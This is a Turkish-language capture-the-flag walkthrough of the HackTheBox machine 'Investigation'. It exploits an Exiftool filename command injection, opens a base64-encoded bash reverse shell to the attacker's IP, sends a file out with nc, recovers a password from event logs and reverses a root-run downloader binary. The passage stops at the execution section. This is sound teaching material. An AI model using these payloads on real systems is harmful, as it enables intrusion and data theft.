---
{"dg-publish":true,"permalink":"/ctf/investigation/"}
---


![Pasted image 20250108190926.png](/img/user/resimler/Pasted%20image%2020250108190926.png)


Araştırma, kullanıcıların resim yüklemesine izin veren ve bu resimlerde [[Bağlantılar/Exiftool\|Exiftool]] çalıştıran bir web sitesiyle başlıyor. Kullanılan sürümde bir komut enjeksiyonu zafiyeti var. Bu zafiyeti inceleyecek ve ardından bir başlangıç erişimi elde etmek için istismar edeceğim. Daha sonra bir dizi **Windows olay günlüğü** bulup bunları analiz ederek bir parola çıkaracağım. Son olarak, **root** olarak çalışan bir kötü amaçlı yazılım bulup, bunu anlamaya çalışarak komut yürütme elde edeceğim.

## Box Info

|Name|[Investigation](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Finvestigation)[![Investigation](https://0xdf.gitlab.io/icons/box-investigation.png)](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Finvestigation)  <br>[Play on HackTheBox](https://hacktheboxltd.sjv.io/g1jVD9?u=https%3A%2F%2Fapp.hackthebox.com%2Fmachines%2Finvestigation)|
|---|---|
|Release Date|[21 Jan 2023](https://twitter.com/hackthebox_eu/status/1616103239899914240)|
|Retire Date|22 Apr 2023|
|OS|Linux ![Linux](https://0xdf.gitlab.io/icons/Linux.png)|
|Base Points|Medium [30]|
|Rated Difficulty|![Rated difficulty for Investigation](https://0xdf.gitlab.io/img/investigation-diff.png)|
|Radar Graph|![Radar chart for Investigation](https://0xdf.gitlab.io/img/investigation-radar.png)|
|![First Blood User](https://0xdf.gitlab.io/icons/first-blood-user.png)|00:17:46[![jkr](https://www.hackthebox.com/badge/image/77141)](https://app.hackthebox.com/users/77141)|
|![First Blood Root](https://0xdf.gitlab.io/icons/first-blood-root.png)|00:23:49[![xct](https://www.hackthebox.com/badge/image/13569)](https://app.hackthebox.com/users/13569)|
|Creator|[![Derezzed](https://www.hackthebox.com/badge/image/15515)](https://app.hackthebox.com/users/15515)|

## Recon

### nmap

nmap iki açık TCP portu bulur, SSH (22) ve HTTP (80):

```
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.11.197
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-18 07:03 EDT
Nmap scan report for 10.10.11.197
Host is up (0.087s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.05 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.11.197
Starting Nmap 7.80 ( https://nmap.org ) at 2023-04-18 07:03 EDT
Nmap scan report for 10.10.11.197
Host is up (0.085s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Did not follow redirect to http://eforenzics.htb/
Service Info: Host: eforenzics.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 9.88 seconds
```

[OpenSSH](https://packages.ubuntu.com/search?keywords=openssh-server) ve [Apache](https://packages.ubuntu.com/search?keywords=apache2) sürümlerine göre, host muhtemelen Ubuntu 20.04 focal çalıştırıyor.

Port 80'de eforenzics.htb'ye bir yönlendirme var. Farklı yanıt veren herhangi bir subdomain aramak için wfuzz kullanacağım, ancak hiçbir şey bulamadım. Bunu hosts dosyama ekleyeceğim:

```
10.10.11.197 eforenzics.htb
```


### Website - TCP 80

#### Site

Site bir forensics  şirketi için:

![Pasted image 20250108192122.png](/img/user/resimler/Pasted%20image%2020250108192122.png)

Sayfadaki tüm linkler, /service.html adresine gidenler hariç, sayfadaki diğer linklere gitmektedir. Bu sayfa özellikle JPG dosyaları üzerinde “Image Forensics” sunmaktadır:

![Pasted image 20250108192220.png](/img/user/resimler/Pasted%20image%2020250108192220.png)

Bir JPG verdiğinizde, bir “report” için bir link sunuyor:

![Pasted image 20250108192253.png](/img/user/resimler/Pasted%20image%2020250108192253.png)

Bu report `[özel karakterler kaldırılmış orijinal dosya adı].txt` şeklindedir. Yani htb.jpg, htbjpg.txt olur:

```
ExifTool Version Number         : 12.37
File Name                       : htb.jpg
Directory                       : .
File Size                       : 6.3 KiB
File Modification Date/Time     : 2023:04:18 12:42:04+00:00
File Access Date/Time           : 2023:04:18 12:42:04+00:00
File Inode Change Date/Time     : 2023:04:18 12:42:04+00:00
File Permissions                : -rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.01
Resolution Unit                 : None
X Resolution                    : 1
Y Resolution                    : 1
Image Width                     : 200
Image Height                    : 200
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
Image Size                      : 200x200
Megapixels                      : 0.040
```

Bu Exiftool'un [çıktısıdır](https://exiftool.org/).


#### Tech Stack

Sitedeki sayfalar **index.html** ve **services.html**. Ancak, bir görüntü yüklediğimde **upload.php**'ye gidiyor, yani site çoğunlukla statik sayfalardan oluşan bir PHP sitesi.

Yukarıda belirtildiği gibi, görüntülerdeki **`metadata`** bilgilerini almak için **Exiftool** kullanılıyor ve çıktı, kullanılan sürümün **12.37** olduğunu gösteriyor.

#### Directory Brute Force

Feroxbuster'ı siteye karşı çalıştıracağım ve -x php,html ekleyeceğim:

```
oxdf@hacky$ feroxbuster -u http://eforenzics.htb -x php,html

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.9.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://eforenzics.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.9.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        1l        3w       16c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      208l      629w    10957c http://eforenzics.htb/index.html
200      GET       82l      198w     3773c http://eforenzics.htb/upload.php
301      GET        9l       28w      317c http://eforenzics.htb/assets => http://eforenzics.htb/assets/
200      GET    10598l    42768w   280364c http://eforenzics.htb/assets/vendors/jquery/jquery-3.4.1.js
200      GET     1081l     1807w    16450c http://eforenzics.htb/assets/vendors/themify-icons/css/themify-icons.css
200      GET       32l       73w      780c http://eforenzics.htb/assets/js/efore.js
200      GET      162l      483w     4838c http://eforenzics.htb/assets/vendors/bootstrap/bootstrap.affix.js
200      GET      208l      629w    10957c http://eforenzics.htb/
200      GET       91l      227w     4335c http://eforenzics.htb/service.html
200      GET       76l      475w    36057c http://eforenzics.htb/assets/imgs/avatar3.jpg
200      GET       48l      247w    20651c http://eforenzics.htb/assets/imgs/avatar2.jpg
301      GET        9l       28w      321c http://eforenzics.htb/assets/css => http://eforenzics.htb/assets/css/
301      GET        9l       28w      320c http://eforenzics.htb/assets/js => http://eforenzics.htb/assets/js/
200      GET    11691l    23373w   242712c http://eforenzics.htb/assets/css/efore.css
200      GET     7013l    22369w   222911c http://eforenzics.htb/assets/vendors/bootstrap/bootstrap.bundle.js
200      GET       61l      353w    29810c http://eforenzics.htb/assets/imgs/avatar1.jpg
301      GET        9l       28w      322c http://eforenzics.htb/assets/imgs => http://eforenzics.htb/assets/imgs/
[####################] - 3m    645225/645225  0s      found:17      errors:177145 
[####################] - 3m    129024/129024  691/s   http://eforenzics.htb/ 
[####################] - 3m    129024/129024  693/s   http://eforenzics.htb/assets/ 
[####################] - 3m    129024/129024  696/s   http://eforenzics.htb/assets/js/ 
[####################] - 3m    129024/129024  692/s   http://eforenzics.htb/assets/css/ 
[####################] - 3m    129024/129024  689/s   http://eforenzics.htb/assets/imgs/ 
```

Birkaç tane var ama ilginç bir şey yok.

## Shell as www-data

### CVE-2022-23935

#### Identify

Google'da “exiftool 12.37” araması yapıldığında, en üstteki sonuç 12.38'den önce Exiftool'daki bir command injection açığı ile ilgilidir:

![Pasted image 20250108193013.png](/img/user/resimler/Pasted%20image%2020250108193013.png)

Sorun, bu [gist](https://gist.github.com/ert-plus/1414276e4cb5d56dd431c2f0429e4429)'te açıklandığı gibi, Perl'in `open` komutuyla "|" karakteriyle biten dosya adlarını nasıl işlediğiyle ilgilidir. [Pikaboo](https://0xdf.gitlab.io/2021/12/04/htb-pikaboo.html#exploit-cvsupdate)'da, Perl'in `<>` operatörünü kullanan bir script'e bunu kötüye kullanma sürecini adım adım anlatmıştım. Bu operatör, içinde bir `open` çağrısını da içeren bir kısayoldur. Exiftool, Perl ile yazılmıştır ve 12.38 sürümünden önce, dosya adının (kullanıcı tarafından kontrol edilen) komut yürütme sağlamak için kullanılabileceği gerçeğini gözden kaçırıyordu.

Exiftool'da [Meta](https://0xdf.gitlab.io/2022/06/11/htb-meta.html#exiftool-exploit)'da kullandığım farklı bir CVE var, CVE-2021-22204. Bu, dosya adını değil meta verileri zehirlemeyi içeriyordu.

#### Vulnerability Details

Bu bölümdeki hiçbir şey, _Investigation_ (Araştırma) sömürüsüne devam etmek için gerekli değildir. Gist, ilerleyebileceğim bir _Proof of Concept_ (POC) sağlıyor, ancak yine de güvenlik açıklarının nasıl çalıştığını anlamak ilginç ve değerlidir. Bunu bu [videoda](https://www.youtube.com/watch?v=UiRx1Zkeqzg) inceleyeceğim:

Özet noktalar şunlardır:

- `open` ile geçirilen bir dosya adı `|` karakteriyle bitiyorsa, `|` öncesindeki string bir komut olarak çalıştırılır ve komutun çıktısı (STDOUT’a gönderilen) oluşturulan file handle'ından okunur.
- Exiftool, `.gz` veya `.bz2` uzantılı bir dosya tespit ettiğinde, dosya adını sıkıştırmayı açacak bir komut içerecek şekilde değiştirir ve çıktıyı işler. Örneğin, `.gz` dosyaları şu hale gelir: `gzip -dc "$file" |`.
- Daha sonra, Exiftool dosyayı açarken, `|` karakterini açıkça kontrol eder ve çalıştırmaya izin veren modda açılıp açılmayacağını belirler.
- Eğer bir dosya adı `|` ile bitiyorsa ve bu dosya Exiftool ile çalıştırılırsa, dosya adı bir komut olarak yorumlanır ve çalıştırılır.


### RCE

#### POC

Bunu test etmek için, Burp Proxy geçmişinde bir image gönderdiğim HTTP isteğini bulacağım ve bunu Repeater'a göndereceğim:

![Pasted image 20250108193656.png](/img/user/resimler/Pasted%20image%2020250108193656.png)


Dosya adı form data meta verilerinde ayarlanmıştır. Bunu ping -c 10.10.14.6| olarak değiştireceğim ve ICMP'yi dinlemek için tcpdump'ı başlatacağım. İstek gönderildiğinde, bir ICMP paketi geri geliyor:

```
oxdf@hacky$ sudo tcpdump -ni tun0 icmp
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
12:51:18.487116 IP 10.10.11.197 > 10.10.14.6: ICMP echo request, id 2, seq 1, length 64
12:51:18.487125 IP 10.10.14.6 > 10.10.11.197: ICMP echo reply, id 2, seq 1, length 64
```

Bu, Investigation kod yürütme.


#### Shell

Bir shell elde etmek için, [bash reverse shell'i](https://www.youtube.com/watch?v=OjkVep2EIlw) deneyeceğim. Muhtemelen gerekli özel karakterler nedeniyle ham formda çalışmıyor. Shell'i base64-encode edeceğim, özel karakterler kalmayana kadar fazladan boşluklarla uğraşacağım (her zaman gerekli değildir, ancak yardımcı olabilir):

```
oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxCg==

oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1 ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIAo=

oxdf@hacky$ echo 'bash -i &> /dev/tcp/10.10.14.6/443 0>&1  ' | base64 -w0
YmFzaCAtaSAmPiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxICAK
```

Kısaca = ifadesini olmamasını istiyoruz . 

Şimdi bunu dosya adı olarak göndereceğim:

![Pasted image 20250108194133.png](/img/user/resimler/Pasted%20image%2020250108194133.png)

Takılıyor, ama dinleme nc'sinde bir shell var:

```
oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 37680
bash: cannot set terminal process group (960): Inappropriate ioctl for device
bash: no job control in this shell
www-data@investigation:~/uploads/1681837009$
```

Shell'i [standart numara](https://www.youtube.com/watch?v=DqE6DxqJg8Q) ile yükselteceğim:

```
www-data@investigation:~/uploads/1681837009$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
www-data@investigation:~/uploads/1681837009$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
www-data@investigation:~/uploads/1681837009$
```


## Shell as smorton

### Enumeration

#### smorton

Kutuda tek bir home dizini var ve www-data buna erişemiyor:

```
www-data@investigation:/$ ls /home/
smorton
www-data@investigation:/$ cd /home/smorton/
bash: cd: /home/smorton/: Permission denied
```

Dosya sisteminde başka ilginç bir şey yok. Smorton'a ait dosyalara bakacağım:

```
www-data@investigation:/$ find / -user smorton 2>/dev/null
/home/smorton
/usr/local/investigation/Windows Event Logs for Analysis.msg
```

Investigation dizini, daha fazla incelemeye değer.

#### investigation Directory

Dizinde iki dosya bulunmaktadır:

```
www-data@investigation:/usr/local/investigation$ ls -l
total 1280
-rw-rw-r-- 1 smorton  smorton  1308160 Oct  1  2022 'Windows Event Logs for Analysis.msg'
-rw-rw-r-- 1 www-data www-data       0 Oct  1  2022  analysed_log
```

`analysed_log` her zaman 0 byte. Aslında, her beş dakikada bir çalışıp görüntüleri ve analizleri temizlemeden önce buna yazması gereken bir cron işi var, ve bu cron işi `www-data` kullanıcısı tarafından çalıştırılıyor.

```
www-data@investigation:/usr/local/investigation$ crontab -l
...[snip]...
*/5 * * * * date >> /usr/local/investigation/analysed_log && echo "Clearing folders" >> /usr/local/investigation/analysed_log && rm -r /var/www/uploads/* && rm /var/www/html/analysed_images/*
```

Sorun şu ki, bir şekilde analysed_log sabit olarak ayarlanmış:

```
www-data@investigation:/usr/local/investigation$ lsattr analysed_log 
-u--i---------e----- analysed_log
```

Bu yüzden cron ona yazmaya çalıştığında başarısız olur:

---


`lsattr analysed_log` komutu, **analysed_log** dosyasının dosya özelliklerini listelemek için kullanılır. Bu komut, dosyanın sahip olduğu **dosya sisteminin özelliklerini** (attributelerini) gösterir.

Özellikle, dosyaların üzerine yazma, silme veya değiştirme gibi işlemleri engelleyen bazı özellikler olabilir. Örneğin:

- **i**: Dosya, değiştirilmeden yalnızca okunabilir. Yani, üzerine yazılamaz veya silinemez.
- **a**: Dosyaya yalnızca ekleme yapılabilir, üzerine yazılamaz.
- **d**: Dosya silinemez.
- **e**: Dosya bir ext4 dosya sistemi üzerinde "extent" (genişletilmiş) özellikleri kullanıyordur.

Bu komutla, dosyanın üzerinde herhangi bir dosya sistemi kısıtlamasının olup olmadığını kontrol edebilirsiniz. Eğer dosya **"immutable"** (değiştirilemez) gibi bir özellik taşıyorsa, cron işi dosyaya yazma yapamayabilir.


---

```
www-data@investigation:/usr/local/investigation$ date >> /usr/local/investigation/analysed_log
bash: /usr/local/investigation/analysed_log: Operation not permitted
```


Komutlar `&&` ile birleştirildiği için, ilk komut başarısız olduğunda işlem durur ve temizlik işlemi de bozulur.

Ben de .msg dosyasını `nc` (Netcat) kullanarak dışarıya çıkaracağım, önce kendi makinemde bir listener başlatacağım ve ardından dosyayı geri göndereceğim.

```
www-data@investigation:/usr/local/investigation$ cat Windows\ Event\ Logs\ for\ Analysis.msg | nc 10.10.14.6 443
```

---
Bu komut, `"Windows Event Logs for Analysis.msg"` dosyasının içeriğini alır ve **10.10.14.6** IP adresindeki **443 numaralı porta** gönderir.

---

Makineme ulaştı:

```
oxdf@hacky$ nc -lnvp 443 > 'Windows Event Logs for Analysis.msg'
Listening on 0.0.0.0 443
Connection received on 10.10.11.197 42746
```

Her bir eşleşmenin MD5 hash'lerini iki kez kontrol edeceğim.



### Event Log Analysis

#### Extract Message Attachment (Mesaj Ekini Çıkar)

.msg dosyaları Outlook iletileridir. Elimde bir Outlook kopyası olmadığından, msgconvert (`sudo apt install libemail-outlook-message-perl` ile yüklenir) kullanarak mbox biçimine dönüştüreceğim:

```
oxdf@hacky$ msgconvert Windows\ Event\ Logs\ for\ Analysis.msg --mbox emails.mbox
```

Bu, mesajı **emails.mbox** dosyasındaki bir posta kutusuna yazar. Ben de bunu **mutt -f emails.mbox** komutuyla açacağım. Mail dosyası oluşturulup oluşturulmayacağı sorulduğunda "hayır" diyeceğim, ve bu, posta kutusunu tek bir e-posta ile açar.

![Pasted image 20250108195647.png](/img/user/resimler/Pasted%20image%2020250108195647.png)

E-postaya gitmek için enter tuşuna basacağım:

![Pasted image 20250108195702.png](/img/user/resimler/Pasted%20image%2020250108195702.png)

Tom'dan bir mesaj ve bir attachment var. attachment'ları görmek için V'ye basacağım:

![Pasted image 20250108195741.png](/img/user/resimler/Pasted%20image%2020250108195741.png)

Ok tuşuyla evtx-logs.zip dosyasına geleceğim ve kaydetmek için s tuşuna basacağım. Mutt'tan çıktıktan sonra, attachment'ı açacağım:

```
oxdf@hacky$ unzip -l evtx-logs.zip 
Archive:  evtx-logs.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
 15798272  2022-08-01 13:36   security.evtx
---------                     -------
 15798272                     1 file
oxdf@hacky$ unzip evtx-logs.zip 
Archive:  evtx-logs.zip
  inflating: security.evtx  
```

Dosya bir Windows Vista Event log dosyasıdır:

```
oxdf@hacky$ file security.evtx 
security.evtx: MS Windows Vista Event Log, 238 chunks (no. 237 in use), next record no. 20013
```


#### JSON'a Dönüştürme

Bunu analiz edebileceğim bir formata getirebilmek için, olayları JSON formatına dönüştüreceğim. Bunu yapmak için GitHub'dan birkaç farklı araçla denemeler yaptım, ancak [omerbenamram](https://github.com/omerbenamram/evtx) tarafından geliştirilen bu repo'daki **evtx_dump** aracını beğendim. En son sürümünü indireceğim ve bunu kutularımın yolundaki bir klasöre bırakacağım.

Numara şu: Çıktı formatı olarak **jsonl** kullanmak, **json** değil. **json** formatı, kayıt numaralarını içerir ve bu da **jq** gibi araçların bunu çözümlemeye çalışırken hatalarla karşılaşmasına neden olur. **jsonl** formatı ise tüm veriyi tek bir JSON satırında toplar, bu da **jq**'nin düzgün bir şekilde çözümlemesini sağlar.

```
oxdf@hacky$ evtx_dump security.evtx -o jsonl -t 1 -f security.json
oxdf@hacky$ cat security.json | jq . | head
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "System": {
      "Channel": "Security",
      "Computer": "eForenzics-DI",
      "Correlation": null,
      "EventID": 1102,
```


#### Log Summary

İlk olarak, mevcut farklı log türlerini ve bunların sıklığını anlamaya çalışacağım.

```
oxdf@hacky$ cat security.json | jq -r '.Event.System.EventID' | sort -nr | uniq -c | sort -nr            
   5217 4673
   4266 4703
   2972 4658
   2319 4656
    752 4946
    685 4688
    657 4689
    612 4690
...[snip]...
```

En yaygın log türü 4673 ([Yetkili bir servis çağrıldı](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4673)) ve 5000'den fazla kaydı var. Ardından 4703 ([Bir token hakkı ayarlandı](https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4703)) geliyor ve 4000'den fazla kaydı var. Bunlara göz atacağım, ancak pek bir yere gitmiyor.

Ayrıca farklı log türlerine de göz atacağım. Her birini göstermek için, yukarıda alıntıladığım referansı kullanarak bir Bash döngüsü ile ve başlığı almak için biraz `grep` kullanacağım.

```
oxdf@hacky$ cat security.json | jq -r '.Event.System.EventID' | sort -u | while read id; do curl -s https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=${id} | grep -A1 'class="hey"' | grep -v 'class="hey"'; done
        1102: The audit log was cleared
        4611: A trusted logon process has been registered with the Local Security Authority
        4624: An account was successfully logged on
        4625: An account failed to log on
        4627: Group membership information.
        4634: An account was logged off
...[snip]...
```

Bazı ilginç loglar dikkatimi çekiyor:

- **1102**: Denetim kaydı silindi - O sırada bu hesapla yapılan etkinliklere bakmak isteyebilirsiniz.
- **4624**: Bir hesap başarıyla giriş yaptı - Giriş yapan hesaplar hakkında fikir sahibi olmak için.
- **4625**: Bir hesap giriş yapmaya çalıştı ama başarısız oldu - Brute force saldırıları veya diğer garip davranışlar arayın.
- **4688**: Yeni bir process oluşturuldu - Kutuda ilginç processler arayın.
- **4698**: Bir zamanlanmış görev oluşturuldu ve **4702**: Bir zamanlanmış görev güncellendi - Kalıcılık için bakın.
- **4732**: Bir üye, security etkin bir local gruba eklendi - Eğer bu process bir yönetici tarafından yapılmadıysa çok şüpheli olabilir.

Muhtemelen diğer ilginç loglar da vardır. Bunları incelemeye başlayacağım.

#### Logons

Başarılı ve başarısız girişlere bakarak ilginç bir şey bulacağım. Tom'un notunda analistlerin araştırma birimlerine giriş yapıp yapmadıklarını kontrol etmekten bahsediliyor.

Event ID'ye göre filtreleme yapacağım ve her event hakkında çok sayıda veri elde edeceğim:

```
{
  "Event": {
    "#attributes": {
      "xmlns": "http://schemas.microsoft.com/win/2004/08/events/event"
    },
    "EventData": {
      "AuthenticationPackageName": "Negotiate",
      "ElevatedToken": "%%1843",
      "ImpersonationLevel": "%%1833",
      "IpAddress": "-",
      "IpPort": "-",
      "KeyLength": 0,
      "LmPackageName": "-",
      "LogonGuid": "00000000-0000-0000-0000-000000000000",
      "LogonProcessName": "Advapi  ",
      "LogonType": 2,
      "ProcessId": "0x10f0",
      "ProcessName": "C:\\Windows\\System32\\winlogon.exe",
      "RestrictedAdminMode": "-",
      "SubjectDomainName": "WORKGROUP",
      "SubjectLogonId": "0x3e7",
      "SubjectUserName": "EFORENZICS-DI$",
      "SubjectUserSid": "S-1-5-18",
      "TargetDomainName": "Font Driver Host",
      "TargetLinkedLogonId": "0x0",
      "TargetLogonId": "0x2bff71",
      "TargetOutboundDomainName": "-",
      "TargetOutboundUserName": "-",
      "TargetUserName": "UMFD-3",
      "TargetUserSid": "S-1-5-96-0-3",
      "TransmittedServices": "-",
      "VirtualAccount": "%%1842",
      "WorkstationName": "-"
    },
    "System": {
      "Channel": "Security",
      "Computer": "eForenzics-DI",
      "Correlation": {
        "#attributes": {
          "ActivityID": "6A946884-A5BC-0001-D968-946ABCA5D801"
        }
      },
      "EventID": 4624,
      "EventRecordID": 11363364,
      "Execution": {
        "#attributes": {
          "ProcessID": 628,
          "ThreadID": 1664
        }
      },
      "Keywords": "0x8020000000000000",
      "Level": 0,
      "Opcode": 0,
      "Provider": {
        "#attributes": {
          "Guid": "54849625-5478-4994-A5BA-3E3B0328C30D",
          "Name": "Microsoft-Windows-Security-Auditing"
        }
      },
      "Security": null,
      "Task": 12544,
      "TimeCreated": {
        "#attributes": {
          "SystemTime": "2022-08-01T16:00:39.944631Z"
        }
      },
      "Version": 2
    }
  }
}
```


Her bir giriş için kullanıcı adı ve domaini yazdıracağım ve her birinin kaç kez gerçekleştiğine dair bir sayım alacağım.

```
oxdf@hacky$ cat security.json | jq -r '. | select(.Event.System.EventID==4624) | .Event.EventData | .TargetDomainName + "\\" + .TargetUserName' | sort | uniq -c | sort -nr
     49 NT AUTHORITY\SYSTEM
      8 EFORENZICS-DI\SMorton
      4 Window Manager\DWM-3
      4 EFORENZICS-DI\LJenkins
      2 Window Manager\DWM-9
      2 Window Manager\DWM-8
      2 Window Manager\DWM-7
      2 Window Manager\DWM-6
      2 Window Manager\DWM-5
      2 Window Manager\DWM-4
      2 Font Driver Host\UMFD-3
      2 EFORENZICS-DI\LMonroe
      2 EFORENZICS-DI\HMarley
      2 EFORENZICS-DI\AAnderson
      1 Font Driver Host\UMFD-9
      1 Font Driver Host\UMFD-8
      1 Font Driver Host\UMFD-7
      1 Font Driver Host\UMFD-6
      1 Font Driver Host\UMFD-5
      1 Font Driver Host\UMFD-4
```

Filtreyi 4624'ten 4625'e değiştirerek başarısız girişlere aynı şekilde bakarsam, üç tane bulacağım:

```
oxdf@hacky$ cat security.json | jq -r '. | select(.Event.System.EventID==4625) | .Event.EventData | .TargetDomainName + "\\" + .TargetUserName' | sort | uniq -c | sort -nr
      1 EFORENZICS-DI\lmonroe
      1 EFORENZICS-DI\hmraley
      1 \Def@ultf0r3nz!csPa$
```

İlk ikisi yukarıdaki kullanıcılarla eşleşiyor, ancak sonuncusu bir şifre gibi görünüyor, sanki birisi şifresini kullanıcı adı alanına yazmış gibi. Bu, bir kullanıcı bilgisayarının başına geçip bilgisayarın kilidini açacağını düşünerek parolasını yazmaya başladığında, ancak bir nedenle oturum açmadığında meydana gelebilir.


### SSH

Bu şifre SSH üzerinden smorton için çalışır:

```
oxdf@hacky$ sshpass -p 'Def@ultf0r3nz!csPa$' ssh smorton@eforenzics.htb
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-137-generic x86_64)
...[snip]...
smorton@investigation:~$
```

user flag (kullanıcı bayrağı) artık kullanılabilir:

```
smorton@investigation:~$ cat user.txt
fe330173************************
```


## Shell as root

### Enumeration

smorton /usr/bin/binary dosyasını root olarak çalıştırabilir:

```
smorton@investigation:~$ sudo -l
Matching Defaults entries for smorton on investigation:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User smorton may run the following commands on investigation:
    (root) NOPASSWD: /usr/bin/binary
```

Aslında, bunu yalnızca root çalıştırabilir:

```
smorton@investigation:~$ binary
-bash: /usr/bin/binary: Permission denied
smorton@investigation:~$ ls -l /usr/bin/binary 
-r-xr-xr-- 1 root root 19024 Jan  5 16:02 /usr/bin/binary
```

Çalıştırınca sadece “ Exiting...” yazıyor:

```
smorton@investigation:~$ sudo binary
Exiting... 
```

### binary

#### Exfil

Binary'nin bir kopyasını scp üzerinden indireceğim:

```
oxdf@hacky$ sshpass -p 'Def@ultf0r3nz!csPa$' scp smorton@eforenzics.htb:/usr/bin/binary .
```


#### Reversing

Ghidra'da açıp bir göz atacağım. Tüm eylem main'de. main'in iki argümanı var, argc komut satırı argümanlarının sayısı ve argv argüman array'ine bir pointer. Bunları ve derlemedeki diğer değişkenleri yeniden adlandıracağım ve yeniden yazacağım.

Kod, iki arg (program adını da sayarsak üç) olup olmadığını ve mevcut kullanıcının root olup olmadığını kontrol ederek başlar, her iki kontrol de başarısız olursa çıkar:

```
  if (argc != 3) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  userid = getuid();
  if (userid != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
```

==UYARI: Subroutine geri dönmüyor==

Ardından ikinci arg'ın “lDnxUysaQn” stringi olduğunu doğrular:

```
  res = strcmp(argv[2],"lDnxUysaQn");
  if (res != 0) {
    puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
```

Bunu yazma modunda bir dosya olarak açıyor.

```
puts("Running... "); 
filehandle = fopen(argv[2],"wb");
```

Daha sonra bir web isteği yapmak için curl kullanır:

```
  curl_object = curl_easy_init();
  curl_easy_setopt(curl_object,0x2712,argv[1]);
  curl_easy_setopt(curl_object,0x2711,filehandle);
  curl_easy_setopt(curl_object,0x2d,1);
  res = curl_easy_perform(curl_object);
```

Öncelikle URL'yi (0x2712), komut satırından alınan ilk argümana ayarlar. Ardından, output dosyasını (0x2711), `lDnxUysaQn` dosyasından alınan filehandle'a ayarlar. 0x2d verbose modunu etkinleştirir ve ardından `curl` komutunu çalıştırır.

Eğer `curl` başarılı olursa, şu işlemleri gerçekleştirir:

```
  if (res == 0) {
    res = snprintf((char *)0x0,0,"%s",argv[2]);
    arg2_str = (char *)malloc((long)res + 1);
    snprintf(arg2_str,(long)res + 1,"%s",argv[2]);
    res = snprintf((char *)0x0,0,"perl ./%s",arg2_str);
    cmd_str = (char *)malloc((long)res + 1);
    snprintf(cmd_str,(long)res + 1,"perl ./%s",arg2_str);
    fclose(filehandle);
    curl_easy_cleanup(curl_object);
    setuid(0);
    system(cmd_str);
    system("rm -f ./lDnxUysaQn");
    return 0;
  }
  puts("Exiting... ");
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```

Bu kod, `perl ./[arg2]` gibi bir komut stringi  oluşturmak için garip bir yol izliyor. İndirilen her neyse, bunu `perl` ile çalıştırıyor. Ardından, bu dosyayı silmeyi de içeren bir temizlik işlemi yapıyor ve geri dönüyor.

Bu dosya, bir adli bilişim firması tarafından analiz edilen bir **zararlı yazılım** parçası olarak değerlendirilmediği sürece pek mantıklı görünmüyor.

### Execution

#### Obvious [Option 1]

